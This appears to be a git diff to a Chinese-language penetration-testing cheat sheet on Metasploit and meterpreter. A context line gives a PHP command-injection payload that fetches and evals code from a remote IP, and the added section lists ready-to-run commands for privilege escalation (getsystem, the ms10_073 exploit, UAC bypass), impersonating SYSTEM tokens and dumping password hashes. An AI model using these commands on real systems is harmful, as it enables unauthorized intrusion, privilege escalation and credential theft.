@@ -210,5 +210,38 @@ shell升级为meterpreter
 		命令注入漏洞： ``php -d allow_url_fopen=true -r "eval(file_get_contents('http://172.20.163.160:1111/OgsOFaj3yKH'));"`` 
 		远程文件包含漏洞： ``http://172.20.163.160:1111/OgsOFaj3yKH`` 
 
+meterpreter提权
+-----------------------------------------
+- getsystem提权
+- exp提权
+	::
+	
+		meterpreter > background //先后台运行会话[*] Backgrounding session 1…
+		msf > use post/windows/escalate/ms10_073_kbdlayout
+		msf > show options
+		msf > set session 1 //设置要使用的会话
+		msf post(ms10_073_kbdlayout) > exploit
+		
+		或直接用一下命令：
+		meterpreter > run post/windows/escalate/ms10_073_kbdlayout
+- 盗取令牌
+	::
+	
+		meterpreter > use incognito //进入这个模块
+		meterpreter > list_tokens –u //查看存在的令牌
+		meterpreter > impersonate_token NT AUTXXXX\SYSTEM //令牌是DelegationTokens一列，getuid查看，两个斜杠
+		注意：只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌，一般大多数的服务型账户（IIS、MSSQL等）有
+		这个权限，大多数用户级的账户没有这个权限。一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权
+		限的，建好的账户没有这个权限。使用菜刀（IIS服务器权限）反弹meterpreter是服务型权限。
+- Bypassuac
+	::
+	
+		msf > use exploit/windows/local/bypassuac //32位与64位一样，其他几个模块也一样
+		msf > show options
+		msf > set session 4
+		msf > run //成功后会返回一个新的session，进入新会话，发现权限没变，使用getsystem即可完成提权
+- Hash
+	``meterpreter > run post/windows/gather/smart_hashdump`` 
+
 
 .. |shell1| image:: ../images/shell1.png
